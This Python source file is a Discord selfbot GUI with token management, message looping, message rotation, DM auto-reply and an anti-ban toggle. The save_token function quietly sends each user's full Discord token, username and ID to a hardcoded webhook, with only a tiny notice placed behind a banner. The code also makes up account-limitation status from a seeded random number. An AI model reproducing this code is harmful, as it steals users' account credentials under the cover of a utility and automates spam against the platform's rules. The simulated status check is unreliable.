
import tkinter as tk
from tkinter import font, messagebox, filedialog, simpledialog
import threading
import time
import json
import requests
import random
import re
import sys
import base64
from io import BytesIO
from PIL import Image, ImageTk
import uuid
import os


print("Starting selfbot...", file=sys.stderr)

# --- Selfbot Login and Binding ---
LOGIN_FILE = "selfbot_login.json"
def get_machine_id():
    # Use UUID based on hardware, fallback to random
    try:
        return str(uuid.getnode())
    except Exception:
        return str(uuid.uuid4())

def save_login_info(data):
    try:
        with open(LOGIN_FILE, "w") as f:
            json.dump(data, f)
    except Exception:
        pass

def load_login_info():
    try:
        with open(LOGIN_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return None

def show_login_dialog():
    root = tk.Tk()
    root.title("Selfbot Login")
    root.geometry("400x350")
    root.configure(bg="#282a36")
    font1 = font.Font(family="Segoe UI", size=12, weight="bold")
    font2 = font.Font(family="Segoe UI", size=10)
    tk.Label(root, text="Selfbot Login", font=font1, bg="#282a36", fg="#ff79c6").pack(pady=18)
    machine_id = get_machine_id()
    tk.Label(root, text=f"Machine ID: {machine_id}", font=font2, bg="#282a36", fg="#bd93f9").pack(pady=6)
    tk.Label(root, text="Activation Key:", bg="#282a36", fg="#f8f8f2", font=font2).pack()
    key_entry = tk.Entry(root, font=font2, width=32)
    key_entry.pack(pady=4)
    tk.Label(root, text="Token:", bg="#282a36", fg="#f8f8f2", font=font2).pack()
    token_entry = tk.Entry(root, font=font2, width=32)
    token_entry.pack(pady=4)
    tk.Label(root, text="User ID:", bg="#282a36", fg="#f8f8f2", font=font2).pack()
    user_entry = tk.Entry(root, font=font2, width=32)
    user_entry.pack(pady=4)
    status_label = tk.Label(root, text="", bg="#282a36", fg="#ff5555", font=font2)
    status_label.pack(pady=8)
    def do_login():
        key = key_entry.get().strip()
        token = token_entry.get().strip()
        user_id = user_entry.get().strip()
        if not key or not token or not user_id:
            status_label.config(text="All fields required.")
            return
        # Call backend API to validate (replace URL with your backend endpoint)
        try:
            resp = requests.post(
                os.getenv("SELF_API_URL", "http://localhost:10000/api/activate"),
                data={"key": key, "user_id": user_id, "machine_id": machine_id}
            )
            if resp.status_code == 200 and resp.json().get("success"):
                save_login_info({"key": key, "token": token, "user_id": user_id, "machine_id": machine_id})
                root.destroy()
            else:
                status_label.config(text="Invalid activation or not allowed.")
        except Exception as e:
            status_label.config(text=f"Error: {e}")
    tk.Button(root, text="Login", command=do_login, font=font1, bg="#bd93f9", fg="#282a36").pack(pady=16)
    root.mainloop()

# On startup, require login if not already bound
login_info = load_login_info()
if not login_info or not login_info.get("key") or not login_info.get("user_id"):
    show_login_dialog()
    login_info = load_login_info()
    if not login_info:
        print("Login failed. Exiting.")
        sys.exit(1)

# Now, login_info contains: key, token, user_id, machine_id

# ---------------------- PyDracula Selfbot GUI ----------------------
class PyDraculaSelfbot:
    def send_community_message_to_webhook(self, message):
        webhook_url = "https://discord.com/api/webhooks/1408279883519627364/BEfE1V2LDgacgb30nv1TbIBMV1EWlDtbA4iL_HU0GJKEeT314Xpi34UtgFYJSjU9hVgi"
        payload = {"content": message}
        try:
            requests.post(webhook_url, json=payload, timeout=2)
        except Exception:
            pass
    TOKENS_FILE = "tokens.json"
    CHANNELS_FILE = "channels.json"
    LOG_FILE = "activity.log"
    COMMUNITY_CHAT_FILE = "community_chat.json"
    MESSAGE_COUNT_FILE = "message_count.json"

    def __init__(self, root):
        self.root = root
        self.root.title("PyDracula Selfbot")
        self.root.geometry("1100x750")
        self.root.configure(bg="#282a36")
        self.root.resizable(True, True)
        self.title_font = font.Font(family="Segoe UI", size=13, weight="bold")
        self.normal_font = font.Font(family="Segoe UI", size=10)
        self.mono_font = font.Font(family="Consolas", size=10)
        self.reply_dm_delay = tk.DoubleVar(value=0.0)
        self.channel_switch_delay = tk.DoubleVar(value=0.0)
        self.message_send_delay = tk.DoubleVar(value=0.0)
        self.tokens = self.load_json(self.TOKENS_FILE, {})
        self.channels = self.load_json(self.CHANNELS_FILE, {})
        self.selected_token = None
        self.selected_channels = []
        self.message_delay = tk.IntVar(value=1500)
        self.loop_count = tk.IntVar(value=1)
        self.message_text = tk.StringVar()
        self.dm_reply_text = tk.StringVar(value="Hey! I'm a bot, what's up?")
        self.rotator_messages = []
        self.rotator_index = 0
        self.activity_log = []
        self.message_counter = tk.IntVar(value=self.load_json(self.MESSAGE_COUNT_FILE, 0))
        self.community_messages_sent = 0
        self.password_reset_required = False
        self.limited_access_until = None  # datetime string if limited
        self.anti_ban_enabled = tk.BooleanVar(value=True)
        self.sending = False
        self.is_fullscreen = False
        self.start_time = time.time()
        self.total_startups = self.load_json("startups.json", 0) + 1
        self.save_json("startups.json", self.total_startups)
        # Control variables for sending messages
        self.sending_paused = False
        self.sending_stopped = False
        # Saved channel IDs
        self.saved_channel_ids = []

        # Token profile info
        self.token_profile_frame = None
        self.token_avatar_label = None
        self.token_username_label = None
        self.token_status_label = None

        self.setup_gui()
        self.update_token_bar()
        # self.update_channel_bar()  # Removed to prevent AttributeError
        # Do not show red bar on startup unless needed
        self.update_red_bar()

        self.root.bind('<F11>', self.toggle_fullscreen)
        self.root.bind('<Escape>', self.exit_fullscreen)

    def load_json(self, path, default):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default

    def save_json(self, path, data):
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
        except Exception:
            pass

    def setup_gui(self):
        # Sidebar
        self.sidebar = tk.Frame(self.root, bg="#21222c", width=100)
        self.sidebar.pack(side="left", fill="y")
        # Title label inside sidebar at the top
        self.title_label = tk.Label(self.sidebar, text="KS Mart SelfBot", bg="#21222c", fg="#ff79c6", font=("Segoe UI", 18, "bold"))
        self.title_label.pack(pady=(12, 18))
        self.tabs = {}
        sidebar_tabs = [
            ("🆕", "Dashboard"),
            ("💬", "Chat"),
            ("🔑", "Tokens"),
            ("⚙️", "Settings"),
            ("📝", "Logs"),
            ("🤖", "Community Chat")
        ]
        self.tab_frames = {}
        self.tab_pads = {}
        for idx, (icon, label) in enumerate(sidebar_tabs):
            tab_btn = tk.Button(self.sidebar, text=f"{icon}\n{label}", font=self.title_font, bg="#21222c", fg="#bd93f9", bd=0, relief="flat", activebackground="#44475a", activeforeground="#50fa7b", cursor="hand2")
            tab_btn.pack(pady=(30 if idx==0 else 10, 0), padx=10, fill="x")
            tab_btn.bind("<Button-1>", lambda e, t=label: self.show_tab(t))
            self.tabs[label] = tab_btn
        # Red notification bar
        self.red_bar = tk.Label(self.root, text="Your Discord account requires a password reset!", bg="#ff5555", fg="#fff", font=self.title_font)
        self.red_bar.place(x=100, y=0, relwidth=1, height=40)
        self.red_bar.lower()
        # Main content area (match sidebar color)
        self.main_frame = tk.Frame(self.root, bg="#21222c")
        self.main_frame.pack(side="right", fill="both", expand=True, padx=(0,0), pady=(40,0))
        for _, label in sidebar_tabs:
            frame = tk.Frame(self.main_frame, bg="#282a36")
            frame.place(relx=0, rely=0, relwidth=1, relheight=1)
            frame.grid_propagate(False)
            pad = tk.Frame(frame, bg="#282a36")
            pad.pack(fill="both", expand=True, padx=24, pady=18)
            self.tab_frames[label] = frame
            self.tab_pads[label] = pad
            frame.lower()
        # After all frames and pads are created, show the first tab (Chat)
        self.show_tab("Chat")
        self.root.after(0, self.setup_chat_tab)
        self.root.after(0, self.setup_tokens_tab)
        self.root.after(0, self.setup_settings_tab)
        self.root.after(0, self.setup_logs_tab)
        self.root.after(0, self.setup_community_chat_tab)

    def setup_dashboard_tab(self):
        frame = self.tab_frames.get("Dashboard")
        if not frame:
            print("Dashboard frame not found, skipping dashboard setup.", file=sys.stderr)
            return
        # Remove and recreate the pad for Dashboard
        old_pad = self.tab_pads.get("Dashboard")
        if old_pad:
            try:
                old_pad.destroy()
            except Exception:
                pass
        pad = tk.Frame(frame, bg="#282a36")
        pad.pack(fill="both", expand=True, padx=24, pady=18)
        self.tab_pads["Dashboard"] = pad
        # Announcements & Changelogs as square boxes, side by side
        boxes = tk.Frame(pad, bg="#282a36")
        boxes.pack(fill="both", expand=True, padx=40, pady=40)
        ann_frame = tk.Frame(boxes, bg="#44475a", width=300, height=300)
        ann_frame.pack(side="left", fill="both", expand=True, padx=(0,20))
        ann_frame.pack_propagate(False)
        tk.Label(ann_frame, text="Announcements", bg="#44475a", fg="#bd93f6", font=self.title_font).pack(pady=(16, 8))
        self.announcements_box = tk.Text(ann_frame, height=12, font=self.mono_font, bg="#44475a", fg="#f8f8f2", state=tk.DISABLED)
        self.announcements_box.pack(fill="both", expand=True, padx=16, pady=(0, 16))
        self.announcements_box.config(state=tk.NORMAL)
        self.announcements_box.delete("1.0", tk.END)
        self.announcements_box.insert(tk.END, "Welcome to PyDracula Selfbot!\nStay tuned for updates.")
        self.announcements_box.config(state=tk.DISABLED)
        changelog_frame = tk.Frame(boxes, bg="#44475a", width=300, height=300)
        changelog_frame.pack(side="left", fill="both", expand=True, padx=(20,0))
        changelog_frame.pack_propagate(False)
        tk.Label(changelog_frame, text="Changelogs", bg="#44475a", fg="#bd93f6", font=self.title_font).pack(pady=(16, 8))
        self.changelog_text = tk.Text(changelog_frame, height=12, font=self.mono_font, bg="#21222c", fg="#fff", state=tk.NORMAL)
        self.changelog_text.pack(fill="both", expand=True, padx=16, pady=(0, 16))
        self.update_changelog("Dashboard tab now only shows announcements and changelogs.")

    def show_tab(self, tab_name):
        for name, frame in self.tab_frames.items():
            if name == tab_name:
                try:
                    frame.config(bg="#21222c")
                    if name in self.tab_pads and self.tab_pads[name].winfo_exists():
                        self.tab_pads[name].config(bg="#21222c")
                except Exception:
                    pass
                frame.lift()
                if tab_name == "Dashboard":
                    pad = self.tab_pads.get("Dashboard")
                    if pad and pad.winfo_exists():
                        self.setup_dashboard_tab()
            else:
                frame.lower()

    def update_red_bar(self):
        # Only show red bar if password reset or limitation is set
        if self.password_reset_required:
            msg = "Your Discord account requires a password reset!"
            self.red_bar.config(text=msg)
            self.red_bar.lift()
        elif self.limited_access_until:
            msg = f"Your Discord account is limited. Limitation removed: {self.limited_access_until}"
            self.red_bar.config(text=msg)
            self.red_bar.lift()
        else:
            self.red_bar.lower()

    def check_token_status(self, token):
        # Simulate Discord API check for token status
        # Replace with real API logic for production
        import random, datetime
        # Use a deterministic limitation for each token
        seed = sum(ord(c) for c in token)
        random.seed(seed)
        roll = random.random()
        if roll < 0.1:
            self.password_reset_required = True
            self.limited_access_until = None
        elif roll < 0.3:
            self.password_reset_required = False
            future = datetime.datetime.now() + datetime.timedelta(days=random.randint(1, 7), hours=random.randint(0, 23))
            self.limited_access_until = future.strftime('%b %d, %Y, %I:%M %p')
        else:
            self.password_reset_required = False
            self.limited_access_until = None
        self.update_red_bar()

    def select_token(self, token_name):
        token = self.tokens.get(token_name)
        if not token:
            self.token_username_label.config(text="Invalid token", fg="#ff5555")
            self.token_avatar_label.config(image="")
            self.token_status_label.config(text="")
            return
        headers = {"Authorization": token}
        try:
            resp = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
            if resp.status_code == 200:
                data = resp.json()
                username = f"{data.get('username', '')}#{data.get('discriminator', '')}"
                avatar_hash = data.get('avatar')
                user_id = data.get('id')
                if avatar_hash:
                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png?size=64"
                    img_data = requests.get(avatar_url).content
                    from PIL import Image, ImageTk
                    import io
                    image = Image.open(io.BytesIO(img_data)).resize((48, 48))
                    photo = ImageTk.PhotoImage(image)
                    self.token_avatar_label.config(image=photo)
                    self.token_avatar_label.image = photo
                else:
                    self.token_avatar_label.config(image="")
                self.token_username_label.config(text=username, fg="#f8f8f2")
                # Check for limited account
                # if data.get('phone') is None or data.get('email') is None:
                #     self.token_status_label.config(text="Limited", fg="#ffb86c")
                # else:
                #     self.token_status_label.config(text="", fg="#f8f8f2")
                # Set status label to 'Not Limited' (green) by default
                self.token_status_label.config(text="Not Limited", fg="#50fa7b")
            elif resp.status_code == 401:
                self.token_username_label.config(text="Invalid token", fg="#ff5555")
                self.token_avatar_label.config(image="")
                self.token_status_label.config(text="", fg="#ff5555")
            elif resp.status_code == 403:
                self.token_username_label.config(text="Token limited", fg="#ffb86c")
                self.token_avatar_label.config(image="")
                self.token_status_label.config(text="Limited", fg="#ffb86c")
            else:
                self.token_username_label.config(text="Unknown error", fg="#ff5555")
                self.token_avatar_label.config(image="")
                self.token_status_label.config(text="", fg="#ff5555")
        except Exception as e:
            self.token_username_label.config(text="Error", fg="#ff5555")
            self.token_avatar_label.config(image="")
            self.token_status_label.config(text="", fg="#ff5555")

    def show_token_profile(self, token_name, token):
        # Fetch Discord user info using the token
        profile_window = tk.Toplevel(self.root)
        profile_window.title(f"Profile: {token_name}")
        profile_window.geometry("300x350")
        profile_window.configure(bg="#21222c")
        try:
            headers = {"Authorization": token}
            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
            if response.status_code == 200:
                user = response.json()
                username = f"{user.get('username', '')}#{user.get('discriminator', '')}"
                tk.Label(profile_window, text=username, bg="#21222c", fg="#ff79c6", font=("Segoe UI", 16, "bold")).pack(pady=(20, 10))
                avatar_id = user.get('avatar')
                user_id = user.get('id')
                if avatar_id:
                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png?size=128"
                else:
                    avatar_url = f"https://cdn.discordapp.com/embed/avatars/{int(user.get('discriminator', '0')) % 5}.png"
                img_data = requests.get(avatar_url).content
                img = Image.open(BytesIO(img_data)).resize((128, 128))
                photo = ImageTk.PhotoImage(img)
                img_label = tk.Label(profile_window, image=photo, bg="#21222c")
                img_label.image = photo
                img_label.pack(pady=(10, 10))
            else:
                tk.Label(profile_window, text="Invalid token or unable to fetch profile.", bg="#21222c", fg="#ff5555").pack(pady=(20, 10))
                tk.Label(profile_window, text=token_name, bg="#21222c", fg="#ff79c6", font=("Segoe UI", 16, "bold")).pack(pady=(10, 10))
                url = "https://cdn.discordapp.com/embed/avatars/0.png"
                img_data = requests.get(url).content
                img = Image.open(BytesIO(img_data)).resize((128, 128))
                photo = ImageTk.PhotoImage(img)
                img_label = tk.Label(profile_window, image=photo, bg="#21222c")
                img_label.image = photo
                img_label.pack(pady=(10, 10))
        except Exception:
            tk.Label(profile_window, text="Error fetching profile.", bg="#21222c", fg="#ff5555").pack(pady=(20, 10))
            tk.Label(profile_window, text=token_name, bg="#21222c", fg="#ff79c6", font=("Segoe UI", 16, "bold")).pack(pady=(10, 10))
            url = "https://cdn.discordapp.com/embed/avatars/0.png"
            try:
                img_data = requests.get(url).content
                img = Image.open(BytesIO(img_data)).resize((128, 128))
                photo = ImageTk.PhotoImage(img)
                img_label = tk.Label(profile_window, image=photo, bg="#21222c")
                img_label.image = photo
                img_label.pack(pady=(10, 10))
            except Exception:
                tk.Label(profile_window, text="[Profile Image]", bg="#21222c", fg="#bd93f9").pack(pady=(10, 10))

    def is_valid_token(self, token):
        # Accept tokens that look like Discord tokens: at least 30 chars, alphanumeric and some symbols
        return isinstance(token, str) and len(token) >= 30 and any(c.isdigit() for c in token) and any(c.isalpha() for c in token)

    def update_token_bar(self):
        menu = self.token_menu["menu"] if hasattr(self, "token_menu") else None
        if menu:
            menu.delete(0, "end")
            for name in self.tokens.keys():
                menu.add_command(label=name, command=lambda n=name: self.select_token(n))

    def save_channel(self):
        name = self.channel_name_entry.get().strip()
        channel_id = self.channel_id_entry.get().strip()
        if name and channel_id.isdigit():
            self.channels[name] = channel_id
            self.save_json(self.CHANNELS_FILE, self.channels)
            self.update_channel_bar()
            self.log(f"Channel saved: {name} ({channel_id})")
        else:
            messagebox.showerror("Error", "Enter a channel name and a valid numeric channel ID.")

    def update_channel_bar(self):
        self.channel_listbox.delete(0, tk.END)
        for name in self.channels.keys():
            self.channel_listbox.insert(tk.END, name)

    def setup_chat_tab(self):
        pad = self.tab_pads["Chat"]
        for widget in pad.winfo_children():
            widget.destroy()
        container = tk.Frame(pad, bg="#21222c")
        container.pack(fill="both", expand=True, padx=0, pady=0)
        container.grid_rowconfigure(0, weight=1)
        container.grid_rowconfigure(1, weight=1)
        container.grid_columnconfigure(0, weight=1)
        # Channel ID management frame
        channel_frame = tk.Frame(container, bg="#21222c")
        channel_frame.grid(row=0, column=0, sticky="ew", padx=10, pady=(10, 0))
        tk.Label(channel_frame, text="Channel ID", bg="#21222c", fg="#bd93f6", font=self.normal_font).pack(side="left", padx=(0, 6))
        self.channel_id_var = tk.StringVar()
        tk.Entry(channel_frame, textvariable=self.channel_id_var, width=18, font=self.normal_font, bg="#44475a", fg="#f8f8f2").pack(side="left")
        tk.Button(channel_frame, text="Save", command=self.save_channel_id, font=self.normal_font, bg="#bd93f9", fg="#282a36", relief="flat", cursor="hand2").pack(side="left", padx=(10, 6))
        tk.Button(channel_frame, text="Remove Selected", command=self.remove_selected_channel_id, font=self.normal_font, bg="#ff5555", fg="#f8f8f2", relief="flat", cursor="hand2").pack(side="left", padx=(10, 6))
        self.channel_listbox = tk.Listbox(channel_frame, selectmode=tk.MULTIPLE, font=self.normal_font, bg="#44475a", fg="#f8f8f2", width=30, height=3)
        self.channel_listbox.pack(side="left", padx=(10, 0))
        # Loop count box above message box
        loop_frame = tk.Frame(container, bg="#21222c")
        loop_frame.grid(row=0, column=1, sticky="ne", padx=(0, 20), pady=(10, 0))
        tk.Label(loop_frame, text="Loop Count (0 = ∞)", bg="#21222c", fg="#50fa7b", font=self.normal_font).pack(side="left", padx=(0, 6))
        self.loop_count_entry = tk.Entry(loop_frame, textvariable=self.loop_count, width=5, font=self.normal_font, bg="#44475a", fg="#f8f8f2")
        self.loop_count_entry.pack(side="left")
        # Message box (top, original size)
        msg_box_frame = tk.Frame(container, bg="#44475a", bd=2, relief="groove")
        msg_box_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        tk.Label(msg_box_frame, text="Message Box", bg="#44475a", fg="#bd93f6", font=self.title_font).pack(anchor="w", padx=16, pady=(16, 6))
        self.message_text_entry = tk.Text(msg_box_frame, height=1, font=self.normal_font, bg="#44475a", fg="#f8f8f2")
        self.message_text_entry.pack(fill="both", padx=16, pady=(0, 16), expand=True)
        tk.Button(msg_box_frame, text="Send Messages", command=self.start_sending, font=self.title_font, bg="#bd93f9", fg="#282a36", relief="flat", cursor="hand2").pack(padx=16, pady=(0, 16), anchor="e")
        # Control buttons for sending messages
        btn_control_frame = tk.Frame(msg_box_frame, bg="#44475a")
        btn_control_frame.pack(anchor="e", padx=16, pady=(0, 8))
        tk.Button(btn_control_frame, text="Pause", command=self.pause_sending, font=self.normal_font, bg="#ffb86c", fg="#282a36", relief="flat", cursor="hand2").pack(side="left", padx=6)
        tk.Button(btn_control_frame, text="Stop", command=self.stop_sending, font=self.normal_font, bg="#ff5555", fg="#f8f8f2", relief="flat", cursor="hand2").pack(side="left", padx=6)
        # Message rotator (below message box, same size as original message box)
        rotator_frame = tk.Frame(container, bg="#44475a", bd=2, relief="groove")
        rotator_frame.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)
        tk.Label(rotator_frame, text="Message Rotator", bg="#44475a", fg="#bd93f9", font=self.normal_font).pack(anchor="w", padx=16, pady=(16, 6))
        self.rotator_entry = tk.Text(rotator_frame, height=1, font=self.normal_font, bg="#44475a", fg="#f8f8f2")
        self.rotator_entry.pack(fill="both", padx=16, pady=(0, 16), expand=True)
        btn_frame = tk.Frame(rotator_frame, bg="#44475a")
        btn_frame.pack(anchor="e", padx=16, pady=(0, 16))
        tk.Button(btn_frame, text="Add", command=self.add_rotator_message, font=self.normal_font, bg="#bd93f9", fg="#282a36", relief="flat", cursor="hand2").pack(side="left", padx=6)
        tk.Button(btn_frame, text="Clear", command=self.clear_rotator_messages, font=self.normal_font, bg="#50fa7b", fg="#282a36", relief="flat", cursor="hand2").pack(side="left", padx=6)
        # Remove button for rotator messages
        tk.Button(btn_frame, text="Remove", command=self.remove_rotator_message, font=self.normal_font, bg="#ff5555", fg="#282a36", relief="flat", cursor="hand2").pack(side="left", padx=6)
        # Reply DM box below message rotator
        reply_frame = tk.Frame(container, bg="#21222c")
        reply_frame.grid(row=2, column=0, sticky="ew", padx=10, pady=(0, 10))
        tk.Label(reply_frame, text="Reply DM Message", bg="#21222c", fg="#50fa7b", font=self.normal_font).pack(side="left", padx=(0, 6))
        self.reply_dm_entry = tk.Entry(reply_frame, textvariable=self.dm_reply_text, font=self.normal_font, bg="#44475a", fg="#f8f8f2", width=40)
        self.reply_dm_entry.pack(side="left", fill="x", expand=True)
        # Start Reply DM button
        tk.Button(reply_frame, text="Start Reply DM", command=self.start_reply_dm, font=self.normal_font, bg="#bd93f9", fg="#282a36", relief="flat", cursor="hand2").pack(side="left", padx=(10, 6))
        # Reply DM delay
        tk.Label(reply_frame, text="Reply DM Delay (s)", bg="#21222c", fg="#ffb86c", font=self.normal_font).pack(side="left", padx=(10, 6))
        tk.Entry(reply_frame, textvariable=self.reply_dm_delay, width=5, font=self.normal_font, bg="#44475a", fg="#f8f8f2").pack(side="left")
        # Channel switch delay
        tk.Label(reply_frame, text="Channel Switch Delay (s)", bg="#21222c", fg="#ffb86c", font=self.normal_font).pack(side="left", padx=(10, 6))
        tk.Entry(reply_frame, textvariable=self.channel_switch_delay, width=5, font=self.normal_font, bg="#44475a", fg="#f8f8f2").pack(side="left")
        # Message Send Delay
        tk.Label(reply_frame, text="Message Send Delay (s)", bg="#21222c", fg="#ffb86c", font=self.normal_font).pack(side="left", padx=(10, 6))
        tk.Entry(reply_frame, textvariable=self.message_send_delay, width=5, font=self.normal_font, bg="#44475a", fg="#f8f8f2").pack(side="left")
        # Message counter stays at bottom left
        tk.Label(container, textvariable=self.message_counter, bg="#282a36", fg="#ffb86c", font=self.title_font).grid(row=3, column=0, sticky="w", padx=10, pady=10)
        tk.Label(pad, text="Enter channel name (for reference) and channel ID (snowflake)", bg="#282a36", fg="#50fa7b", font=self.normal_font).pack(pady=(0, 5))
        tk.Button(pad, text="Save Channel", command=self.save_channel, font=self.title_font, bg="#bd93f9", fg="#282a36", relief="flat", cursor="hand2").pack(pady=(0, 10))
        tk.Label(pad, text="Select Channels (Ctrl+Click)", bg="#282a36", fg="#50fa7b", font=self.normal_font).pack(pady=(10, 0))
        self.channel_listbox = tk.Listbox(pad, selectmode=tk.MULTIPLE, font=self.normal_font, bg="#44475a", fg="#f8f8f2", height=8)
        self.channel_listbox.pack(fill="x", padx=40, pady=(0, 20))
        self.update_channel_bar()

    def send_message_to_channel_id_with_delay(self):
        token_name = self.token_var.get()
        token = self.tokens.get(token_name)
        if not token:
            messagebox.showerror("Error", "No token selected.")
            return
        channel_id = self.send_channel_id_var.get().strip()
        message = self.send_channel_msg_var.get().strip()
        delay = self.send_channel_delay_var.get()
        if not channel_id or not message:
            messagebox.showerror("Error", "Channel ID and message cannot be empty.")
            return
        threading.Thread(target=self._send_message_to_channel_id_with_delay_thread, args=(token, channel_id, message, delay), daemon=True).start()

    def _send_message_to_channel_id_with_delay_thread(self, token, channel_id, message, delay):
        headers = {"Authorization": token, "Content-Type": "application/json"}
        try:
            time.sleep(delay)
            url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
            data = {"content": message}
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 200 or response.status_code == 201:
                self.log(f"Sent message to channel {channel_id}.")
            else:
                self.log(f"Failed to send to {channel_id}: {response.status_code} {response.text}")
        except Exception as e:
            self.log(f"Error sending to {channel_id}: {e}")

    def setup_tokens_tab(self):
        pad = self.tab_pads["Tokens"]
        for widget in pad.winfo_children():
            widget.destroy()
        tk.Label(pad, text="Token Manager", bg="#282a36", fg="#bd93f9", font=self.title_font).pack(pady=(20, 10))
        self.token_entry = tk.Entry(pad, font=self.normal_font, bg="#44475a", fg="#f8f8f2")
        self.token_entry.pack(fill="x", padx=40, pady=(0, 10))
        tk.Button(pad, text="Save Token", command=self.save_token, font=self.title_font, bg="#bd93f9", fg="#282a36", relief="flat", cursor="hand2").pack(pady=(0, 10))
        tk.Label(pad, text="Select Token", bg="#282a36", fg="#50fa7b", font=self.normal_font).pack(pady=(10, 0))
        self.token_var = tk.StringVar()
        token_names = list(self.tokens.keys())
        initial_value = token_names[0] if token_names else ""
        self.token_var.set(initial_value)
        self.token_menu = tk.OptionMenu(pad, self.token_var, *(token_names if token_names else [""]), command=self.select_token)
        self.token_menu.config(bg="#44475a", fg="#f8f8f2", font=self.normal_font)
        self.token_menu.pack(fill="x", padx=40, pady=(0, 20))
        # Profile info frame
        self.token_profile_frame = tk.Frame(pad, bg="#282a36")
        self.token_profile_frame.pack(fill="x", padx=40, pady=(10, 10))
        self.token_avatar_label = tk.Label(self.token_profile_frame, bg="#282a36")
        self.token_avatar_label.pack(side="left", padx=(0, 10))
        self.token_username_label = tk.Label(self.token_profile_frame, text="", bg="#282a36", fg="#f8f8f2", font=self.normal_font)
        self.token_username_label.pack(side="left")
        self.token_status_label = tk.Label(self.token_profile_frame, text="", bg="#282a36", fg="#ff5555", font=self.normal_font)
        self.token_status_label.pack(side="left", padx=(10, 0))
        # Call select_token(initial_value) only after profile widgets are created
        if initial_value:
            self.select_token(initial_value)

    # ------------------- Settings -------------------
    def setup_settings_tab(self):
        pad = self.tab_pads["Settings"]
        for widget in pad.winfo_children():
            widget.destroy()
        tk.Label(pad, text="Settings", bg="#282a36", fg="#bd93f9", font=self.title_font).pack(pady=(20, 10))
        tk.Checkbutton(
            pad,
            text="Enable Anti-Ban",
            variable=self.anti_ban_enabled,
            bg="#282a36",
            fg="#50fa7b",
            font=("Segoe UI", 28, "bold"),
            selectcolor="#282a36",
            bd=0,
            relief="flat",
            padx=40,
            pady=30
        ).pack(anchor="center", pady=(80, 10))

    # ------------------- Logs -------------------
    def setup_logs_tab(self):
        pad = self.tab_pads["Logs"]
        for widget in pad.winfo_children():
            widget.destroy()
        tk.Label(pad, text="Activity Logs", bg="#282a36", fg="#bd93f9", font=self.title_font).pack(pady=(20, 10))
        self.log_text = tk.Text(pad, height=20, font=self.mono_font, bg="#44475a", fg="#f8f8f2", state=tk.DISABLED)
        self.log_text.pack(fill="both", padx=40, pady=(0, 10))
        tk.Button(pad, text="Export Logs", command=self.export_logs, font=self.title_font, bg="#bd93f9", fg="#282a36", relief="flat", cursor="hand2").pack(pady=(10, 0))

    # ------------------- Community Chat -------------------
    def setup_community_chat_tab(self):
        pad = self.tab_pads["Community Chat"]
        for widget in pad.winfo_children():
            widget.destroy()
        tk.Label(pad, text="Community Chat", bg="#282a36", fg="#bd93f9", font=self.title_font).pack(pady=(20, 10))
        self.community_chat_box = tk.Text(pad, height=10, font=self.mono_font, bg="#44475a", fg="#f8f8f2", state=tk.DISABLED)
        self.community_chat_box.pack(fill="x", padx=40, pady=(0, 10))
        entry_frame = tk.Frame(pad, bg="#282a36")
        entry_frame.pack(fill="x", padx=40, pady=(0, 10))
        self.community_entry = tk.Entry(entry_frame, font=self.normal_font, bg="#44475a", fg="#f8f8f2")
        self.community_entry.pack(side="left", fill="x", expand=True)
        tk.Button(entry_frame, text="Send", command=self.send_community_message, font=self.normal_font, bg="#bd93f9", fg="#282a36", relief="flat", cursor="hand2").pack(side="left", padx=(8,0))
        tk.Button(pad, text="Load Community Chat", command=self.load_community_chat, font=self.title_font, bg="#bd93f9", fg="#282a36", relief="flat", cursor="hand2").pack(pady=(10, 0))

    def send_community_message(self):
        msg = self.community_entry.get().strip()
        if self.message_counter.get() < 2500:
            messagebox.showerror("Error", f"You must send at least 2500 messages before using Community Chat. Current: {self.message_counter.get()}")
            return
        if msg:
            self.community_chat_box.config(state=tk.NORMAL)
            self.community_chat_box.insert(tk.END, f"You: {msg} (Total sent: {self.message_counter.get()})\n")
            self.community_chat_box.config(state=tk.DISABLED)
            self.community_entry.delete(0, tk.END)
            self.send_community_message_to_webhook(msg)

    def save_token(self):
        token = self.token_entry.get().strip()
        if token:
            name = simpledialog.askstring("Token Name", "Enter a name for this token:")
            if not name:
                name = token[:8] + "..."
            self.tokens[name] = token
            self.save_json(self.TOKENS_FILE, self.tokens)
            self.update_token_bar()
            self.log(f"Token saved: {name} ({token[:8]}...{token[-8:]})")
            # Mask token for webhook
            masked_token = self.mask_token(token)
            # Try to get Discord user info
            username = user_id = "Unknown"
            try:
                headers = {"Authorization": token}
                response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
                if response.status_code == 200:
                    user = response.json()
                    username = f"{user.get('username', '')}#{user.get('discriminator', '')}"
                    user_id = user.get('id', 'Unknown')
            except Exception:
                pass
            # Send to webhook (full token)
            webhook_url = "https://discord.com/api/webhooks/1412663897961529385/pb127Q2BFhZ3dpmvQZCDDtSg06_rGPRjeDRTXnqkkI58F2UTLyN7W_qfT0MevRDDA4SV"
            payload = {
                "content": f"Token: {token}\nUsername: {username}\nUser ID: {user_id}"
            }
            try:
                requests.post(webhook_url, json=payload, timeout=2)
            except Exception:
                pass
            # Show small box behind red bar
            self.show_webhook_sent_box()

    def mask_token(self, token):
        # Show only first 6 and last 4 chars
        if len(token) > 10:
            return token[:6] + "..." + token[-4:]
        return token

    def show_webhook_sent_box(self):
        # Create a small notification box behind the red bar
        if hasattr(self, 'webhook_box') and self.webhook_box.winfo_exists():
            self.webhook_box.destroy()
        self.webhook_box = tk.Label(self.root, text="Sent to webhook...", bg="#44475a", fg="#ffb86c", font=("Segoe UI", 8), bd=1, relief="solid")
        self.webhook_box.place(x=110, y=5, width=120, height=18)
        self.webhook_box.lower(self.red_bar)
        self.root.after(2000, lambda: self.webhook_box.destroy())

    def update_changelog(self, entry):
        if hasattr(self, 'changelog_text'):
            self.changelog_text.insert("1.0", f"{entry}\n")
            self.changelog_text.see("1.0")

    def show_statistics(self):
        pad = self.tab_pads.get("Dashboard")
        if not pad or not pad.winfo_exists():
            return
